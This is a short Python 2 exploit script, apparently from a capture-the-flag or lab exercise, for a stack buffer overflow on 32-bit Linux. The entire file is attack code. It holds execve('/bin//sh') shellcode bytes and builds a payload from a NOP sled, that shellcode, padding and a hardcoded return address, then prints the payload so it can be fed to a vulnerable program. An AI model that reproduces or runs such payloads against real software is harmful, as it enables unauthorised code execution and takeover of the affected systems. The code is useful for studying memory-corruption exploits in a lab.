import struct
# from pwn import *
# context(arch='i386', os='linux')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

bufsize = 100
offset = 12
nopsize = 4096

payload = "\x90" * 100 + shellcode + "A" * \
    131 + "\x00" + "A" * 3 + "\xf4\x29\x8b\xff"

print payload
